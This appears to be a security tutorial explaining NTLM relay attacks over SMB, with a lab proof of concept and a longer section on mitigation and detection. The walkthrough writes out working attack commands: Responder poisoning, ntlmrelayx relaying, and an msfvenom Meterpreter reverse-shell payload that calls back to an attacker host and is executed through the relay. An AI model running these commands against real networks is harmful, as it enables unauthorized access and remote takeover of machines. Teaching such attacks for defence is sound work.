# NTLM Relay Attacks: Understanding and Exploiting SMB Weaknesses

## Introduction

In Windows environments, the NTLM (NT LAN Manager) authentication protocol remains widely supported for backward compatibility. However, this legacy support often introduces critical vulnerabilities that attackers can exploit, even today. One of the most notorious techniques is NTLM relay attacks, particularly through SMB (Server Message Block) protocol abuse.

This article examines how NTLM relay attacks work, the technical conditions required for success, and the defensive strategies organizations must adopt to prevent exploitation.

## Understanding NTLM Relay

### What is NTLM Relay?

NTLM relay is a classic man-in-the-middle (MITM) attack where an adversary intercepts legitimate NTLM authentication attempts and "relays" them to a target server, effectively impersonating the user without needing to crack passwords or hashes.

The protocol's design flaw is that it trusts the initial authentication handshake without verifying the intended recipient, allowing attackers to reuse authentication tokens elsewhere.

### Technical Operation of NTLM Relay

The attack flow typically involves:

1. Capturing an authentication attempt from a legitimate user (often by poisoning LLMNR/NBT-NS traffic)
2. Intercepting the NTLM negotiation process using tools like Responder
3. Forwarding (relaying) the authentication attempt to a third-party server that trusts NTLM authentication
4. Gaining unauthorized access to the target server with the victim user's privileges

The success of the attack depends heavily on environmental factors such as SMB signing configurations and user privileges.

## Conditions for a Successful SMB/NTLM Relay Attack

To perform a successful NTLM relay attack over SMB, the following conditions must be met:

- **SMB Signing Disabled**: The target server must not enforce SMB signing (or have it set to "not required"). SMB signing ensures the authenticity and integrity of SMB packets, mitigating MITM risks.

- **Valid User Permissions**: The relayed credentials must have appropriate permissions on the target server (e.g., admin rights or read/write access to shared resources).

Administrators can assess SMB signing status on network hosts using Nmap scripts, specifically `smb2-security-mode`, which identifies potential vulnerable systems.

## Practical Example: Proof of Concept

### Lab Setup

- Kali Attacker: 10.20.30.50
- Domain Controller (DC): 10.20.30.10
- User Machine 1 (User: ajohnson): 10.20.30.20
- User Machine 2 (User: mjones): 10.20.30.21

Suppose "ajohnson" is an authorized administrator on "mjones"'s machine. Our goal is to leverage ajohnson's credentials, poisoned via LLMNR spoofing, to access mjones's computer.

### Attack Steps

1. **Identify Targets Without SMB Signing**

```bash
nmap -sSV -p 445 --script smb2-security-mode 10.20.30.0/24
```

This command scans the network for hosts with SMB signing either disabled or optional.

2. **Prepare the Environment**

- Configure `responder.conf` to disable SMB and HTTP server functionalities. Responder will only handle poisoning, leaving the relay to `ntlmrelayx`.

```bash
responder -I eth0 -rwd
```

3. **Set Up the Relay Attack**

Use `ntlmrelayx.py` to relay captured authentications to identified targets:

```bash
ntlmrelayx.py -tf targets.txt --smb2support
```

Where `targets.txt` contains IP addresses of machines with SMB signing disabled.

4. **Gaining Shell Access (Optional Payload Execution)**

Generate a payload with Metasploit:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.20.30.50 LPORT=4444 -f exe > shell.exe
```

Set up a handler on the attacker machine:

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.20.30.50
set LPORT 4444
run
```

Relay with payload execution:

```bash
ntlmrelayx.py -tf targets.txt --smb2support -e shell.exe
```

If successful, a Meterpreter session is established, providing full control over the victim machine.

## Tools Commonly Used in NTLM Relay Attacks

**Responder**: A powerful tool to poison LLMNR/NBT-NS traffic and capture authentication attempts.

**Impacket's ntlmrelayx.py**: A Swiss army knife for relaying captured credentials to SMB, HTTP, LDAP, and other services.

**Nmap**: Used for scanning network hosts to identify those vulnerable to relay attacks (especially checking SMB signing status).

**Metasploit Framework**: Used for payload creation and session handling after successful exploitation.

## Impacts and Implications

A successful NTLM relay attack can have severe consequences:

- **Unauthorized Access**: Gaining system or domain access without credentials.
- **Privilege Escalation**: If a privileged account is relayed, attackers can gain administrative control.
- **Lateral Movement**: Using compromised credentials to move across the network.
- **Credential Theft and Persistence**: Attackers can implant backdoors, create rogue accounts, or dump further credentials for continued access.

In penetration testing exercises, NTLM relay remains a highly effective technique for compromising internal networks.

## Mitigation Strategies

### Enforce SMB Signing

Configure Group Policy to require SMB signing on all servers:

- Navigate to: `Computer Configuration -> Policies -> Windows Settings -> Security Settings -> Local Policies -> Security Options`
- Enable: **Microsoft network server: Digitally sign communications (always)**

This ensures that SMB sessions cannot be hijacked.

### Disable Unnecessary Authentication Protocols

- Disable NTLM where possible.
- Force systems to use Kerberos authentication instead.

### Harden LLMNR/NBT-NS Settings

Since many relay attacks begin with LLMNR/NBT-NS poisoning:

- Disable LLMNR and NetBIOS on all clients via Group Policy and adapter settings.

### Monitoring and Detection

- Monitor for suspicious SMB authentication attempts.
- Look for multiple failed SMB authentications from a single host (indicative of Responder activity).
- Deploy EDR solutions capable of detecting MITM tools and behaviors.

## Detection Techniques

### Network-Based Detection

- Capture and analyze SMB negotiation traffic to identify unsigned sessions.
- Detect LLMNR/NBT-NS broadcasts and suspicious replies.

### Host-Based Detection

- Enable detailed logon event auditing.
- Look for unusual login events from systems not typically communicating with each other.

Relevant Event IDs include:

- **4624**: Successful logon
- **4625**: Failed logon
- **4648**: A logon attempt was made using explicit credentials

### Use of Honeypots

Deploy SMB honeypots designed to attract and detect unauthorized relay attempts.

## Real-World Impact

NTLM relay attacks have been leveraged in numerous red team engagements, internal penetration tests, and even real-world breaches. The technique remains popular because it:

- Exploits default settings
- Requires no credentials cracking
- Often bypasses network segmentation and access controls

Without strong SMB signing enforcement and proper protocol hardening, organizations leave themselves vulnerable to devastating lateral movement attacks.

## Conclusion

NTLM relay attacks exemplify how legacy protocol support can severely weaken modern network security. While Windows environments have evolved, many networks still operate with configurations that allow these attacks to thrive.

Mitigating NTLM relay risks requires a multi-faceted approach: disabling vulnerable protocols, enforcing SMB signing, robust network monitoring, and user education. As with many security concerns, defense in depth is critical to reducing the risk and impact of successful relay attacks.

Organizations must treat NTLM relay vulnerabilities with urgency, as attackers increasingly seek the path of least resistance to compromise critical systems.

